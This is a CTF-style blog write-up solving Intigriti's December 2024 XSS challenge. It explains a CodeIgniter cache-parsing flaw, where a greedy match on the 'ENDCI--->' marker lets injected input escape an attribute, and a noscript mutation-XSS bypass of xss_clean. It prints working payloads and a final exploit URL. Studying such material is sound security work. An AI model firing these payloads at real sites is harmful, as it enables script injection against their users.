---
layout: post
title: Intigriti Xss Challenge Dec 2024 Solution

tag:
- ctf
- xss
---


This was really an interesting xss challenge by [@J0R1AN](https://x.com/J0R1AN). I solved this challenge  after the challenge deadline was over but still wanted to do a blogpost cause why not :p


The challenge  looks simple at first, you can see there is one parameter `title` <https://challenge-1224.intigriti.io/index.php/view?title=shirley%3Cimg%20src=x%20onerrpr=alert()%3E> whose value is reflected at two places into the page source. We can also noticed that there is some sanitizer which as input was transformed 

```html
<img src=x onerror=alert()>
<img>
```

The first reflection is inside the h1 tag where it's html encoded and the second one is inside an attribute surrounded by quotes where we can see it's not html encoded.

```html
<h1>shirley&lt;img&gt;</h1>
<div class="fireplace" id="shirley<img>">
```

We can't breakout of the attribute context because the server doesn't allows us to use `"` in the `title` parameter. As there's nothing more into the source now let's move on to the source code as we have been provided.

<https://challenge-1224.intigriti.io/source.zip>

It's written in PHP using the Codeigniter framework. Let's start with looking at the controllers, to get an overview of how the sanitization process is happening and all

We have two controllers Home and View

<http://localhost:8002/index.php/home>

<http://localhost:8002/index.php/view>




```php

// source/src/application/controllers/View.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

function str2id($str)
{
    if (strstr($str, '"')) {
        die('Error: No quotes allowed in attribute');
    }
    // Lowercase everything except first letters
    $str = preg_replace_callback('/(^)?[A-Z]+/', function($match) {
        return isset($match[1]) ? $match[0] : strtolower($match[0]);
    }, $str);
    // Replace whitespace with dash
    return preg_replace('/[\s]/', '-', $str);
}

class View extends CI_Controller
{
    public function index()
    {
        $this->load->helper('string');
        $this->load->helper('security');
        $this->output->cache(1);

        $title = $this->input->get('title') ?: 'Christmas Fireplace'; // [1]

        $title = xss_clean($title);
        $id = str2id($title);

        $this->load->view('view', array(
            "id" => $id,
            "title" => $title
        ));
    }
}

```

On line [1] we can see it retrieves the value of the `title` parameter and the value is passed to `xss_clean` method <https://codeigniter.com/userguide3/libraries/security.html> which comes from the Security Class.
The `str2id` method basically checks to ensure there is'nt any `"` character in the value , then as from the comments it tries to lowercase everything except first letters and replaces whitespace character with dash.

These two values `$id` and `$title` are passed to the view template.



```php

// source/src/application/views/view.php

<h1><?= htmlspecialchars($title) ?></h1>
<div class="fireplace" id="<?= $id ?>">
```

The first reflection point is of not any use as it will be encoded always, the second one is of our interest but as we can't use `"` we can't simply break out of it and try to get xss.

```php
    if (strstr($str, '"')) {
        die('Error: No quotes allowed in attribute');
    }
```

Rest of the interesting things in source are these things:

```php
        $this->load->helper('string');
        $this->load->helper('security');
        $this->output->cache(1);
```

Still we don't see any way to breakout of this , I decided to look at this challenge again in a few days and I forgot about it untill the hints were dropped I realised I don't have much time now 😅.

Anyways from the hint we can see it talks about the cache and the mutate thing.
Mutate is surely related to the `xss_clean` method where we can some mutation vector to bypass the sanitizer, the cache thing was related to use of cache function on the site but I couldn't figured out what it meant really. I was solving this with my friend @0xbla, which then told me that to check the cache folder as there it stores the rendered page content for templates.
I didn't had setup the local environment, so I quickly started one and now I could see the cache files basically they have this format:


```html
// application/cache/52c7c06e8caef34778267035d3d50178

a:2:{s:6:"expire";i:1734579021;s:7:"headers";a:0:{}}ENDCI---><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="/style.css"></head><body background="#483741" class="fire-border"><a href="/index.php" class="top-left">⬅ Go back</a><div class="wrapper"><h1>shirley</h1><ul class="wall"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><div class="crown"><ul class="round"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><ul class="ball"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul></div><div class="fireplace" id="shirley"><div class="bottom"><ul class="ground"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul></div><ul class="top"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><ul class="bricks"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><div class="chimney"></div><div class="chimney-shadow"></div><div class="chimney-fire-wrapper"><ul class="wood"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><div class="fire"></div><ul class="embers"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul></div><div class="candle"><div class="fire"></div></div><div class="candle" id="candle-2"><div class="fire"></div></div><div class="candle" id="candle-3"><div class="fire"></div></div><div class="sock"><div class="second"></div></div><div class="sock" id="sock-2"><div class="second"></div></div><div class="sock" id="sock-3"><div class="second"></div></div></div></div></body></html>
```

The format of this cache file looked weird for eg, the starting data is a serialized string and `ENDCI--->` denotes the end of the serialized data. It still wasn't clear how the escape route is possible from this untill I started looking at how this cache file content is parsed and the data is returned.

```php
// system/core/Output.php

	/**
	 * Update/serve cached output
	 *
	 * @uses	CI_Config
	 * @uses	CI_URI
	 *
	 * @param	object	&$CFG	CI_Config class instance
	 * @param	object	&$URI	CI_URI class instance
	 * @return	bool	TRUE on success or FALSE on failure
	 */
	public function _display_cache(&$CFG, &$URI)
	{
		$cache_path = ($CFG->item('cache_path') === '') ? APPPATH.'cache/' : $CFG->item('cache_path');
		// Build the file path. The file name is an MD5 hash of the full URI
		$uri = $CFG->item('base_url').$CFG->item('index_page').$URI->uri_string;
		if (($cache_query_string = $CFG->item('cache_query_string')) && ! empty($_SERVER['QUERY_STRING']))
		{
			if (is_array($cache_query_string))
			{
				$uri .= '?'.http_build_query(array_intersect_key($_GET, array_flip($cache_query_string)));
			}
			else
			{
				$uri .= '?'.$_SERVER['QUERY_STRING'];
			}
		}
		$filepath = $cache_path.md5($uri);
		if ( ! file_exists($filepath) OR ! $fp = @fopen($filepath, 'rb'))
		{
			return FALSE;
		}
		flock($fp, LOCK_SH);
		$cache = (filesize($filepath) > 0) ? fread($fp, filesize($filepath)) : '';
		flock($fp, LOCK_UN);
		fclose($fp);
		// Look for embedded serialized file info.
		if ( ! preg_match('/^(.*)ENDCI--->/', $cache, $match))   // [1]
		{
			return FALSE;
		}
		$cache_info = unserialize($match[1]);
		$expire = $cache_info['expire'];
		$last_modified = filemtime($filepath);

		// Has the file expired?
		if ($_SERVER['REQUEST_TIME'] >= $expire && is_really_writable($cache_path))
		{
			// If so we'll delete it.
			@unlink($filepath);
			log_message('debug', 'Cache file has expired. File deleted.');
			return FALSE;
		}
		// Send the HTTP cache control headers
		$this->set_cache_header($last_modified, $expire);

		// Add headers from cache file.
		foreach ($cache_info['headers'] as $header)
		{
			$this->set_header($header[0], $header[1]);
		}
		// Display the cache
		$this->_display(self::substr($cache, self::strlen($match[0])));
		log_message('debug', 'Cache file is current. Sending it to browser.');
		return TRUE;
	}
```

Start from line [1], the above comment makes it clear *Look for embedded serialized file info.* . It uses this regex `/^(.*)ENDCI--->/` to get the serialized content of the cache file. So I wondered what if I can include an extra `ENDCI--->` in my input which will be then stored in the cache file  will it affect the output?

```php
php > preg_match('/^(.*)ENDCI--->/', 'a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI--->shirleyINJECTED_ENDCI--->aaaaa', $match);

php > echo $match[0];
a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI--->shirleyINJECTED_ENDCI--->

php > echo $match[1];
a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI--->shirleyINJECTED_
```

And this is how it decides what content to be sent as the cached response.It counts the length of the $match[0] (which contains the serialized data) and everything aside from the serialized data is sent back as the response.

```php
$this->_display(self::substr($cache, self::strlen($match[0])))
```


This was a very interesting behaviour because of the greedy regex match, if we are able to inlcude such `ENDCI--->` inside the attribute value we can break the context.

```html
<div id="Everything before that gets ignored ENDCI---><xss payload>">ssssssssss
```

The cached data which is to be returned by the server will be. 
```html
<xss payload>">ssssssssss
```
As you can see the context break and the browser would happily render our xss payload.

But still I had one doubt on the very next line you can see the serialized data (`$match[1]`) is passed to the `unserialized` method and though having extra characters at the end will create problems but turns out everything is ok?


```php
php > preg_match('/^(.*)ENDCI--->/', 'a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI--->shirley INJECTED_ENDCI--->everything after this will be I
GNORED', $match);
php > print_r(unserialize($match[1]));
Array
(
    [expire] => 1734530101
    [headers] => Array
        (
        )

)
```

The next hurdle was to figure out how to include `--->` character in the page. As attempts like this lead to the `>` get html encoded

```html
--->
<div class="fireplace" id="---&gt;"

<--- a --->
<div class="fireplace" id="&lt;----a----&gt;">

<aaaa id='--->'>
<div class="fireplace" id="<aaaa-id='---&gt;'>">
```

I then decided to simply fuzz `--FUZZ>` this pattern to see if there are any characters which would allow me to have `--->` in output.
Turns out from the result there are a bunch of such characters.

```html
%09
%0D
%20

<div class="fireplace" id="---->">
```

Btw if you look carefully there is an extra `-` which I failed to notice one first try and was wondering why it wasn't working, so thanks to the `str2id` method which was responsible for converting space characters to `-`.Just need to remove one `-` from our input and we are good to go.

```html
--%20>
<div class="fireplace" id="--->">
```

![image](https://gist.github.com/user-attachments/assets/30d0f755-8486-436f-bc11-399efebe3a30)

You can see how it get transformed into

```php
$match[0]
a:2:{s:6:"expire";i:1734589274;s:7:"headers";a:0:{}}ENDCI---><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="/style.css"></head><body background="#483741" class="fire-border"><a href="/index.php" class="top-left">⬅ Go back</a><div class="wrapper"><h1>ENDCI-- &gt;aaaaaa</h1><ul class="wall"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><div class="crown"><ul class="round"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><ul class="ball"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul></div><div class="fireplace" id="ENDCI--->
```
<http://localhost:8002/index.php/view?title=ENDCI--%20%3Eaaaaaa>

![image](https://gist.github.com/user-attachments/assets/427e81af-6166-45ee-9383-ec43ed99da98)

-------------

# Mutation XSS to bypass `xss_clean`

After fuzzing for what tags are allowed I found that it allows noscript,noframes,etc so we can the unfamous noscript mutation vector to bypass this

```html
ENDCI-- >aaaa<noscript>< a id='</noscript><svg/onload=location=name>'></noscript>
```

Notice the space  `< a>` , while playing with the sanitizer I noticed it was removing  the `id` attribrute when I simply put it as `<a` but seems with custom elements it doesn't validates much and the attributes are allowed. I didn't looked into the source of `xss_clean` as I didn't had time.


You can watch these videos for more details:

<iframe width="560" height="315" src="https://www.youtube.com/embed/lG7U3fuNw3A?si=1fyZH3nzhe-nsMu-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="560" height="315" src="https://www.youtube.com/embed/gVrdE6g_fa8?si=HsuvpCHjssUx9RGy" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


And finally here's the alert popup:

<https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3Eaaaa%3Cnoscript%3E%3C%20a%20id%3D%27%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dlocation%3Dname%3E%27%3E%3C%2Fnoscript%3E>

![image](https://gist.github.com/user-attachments/assets/05821e08-3cf7-4839-8970-975f1ffb4aa2)
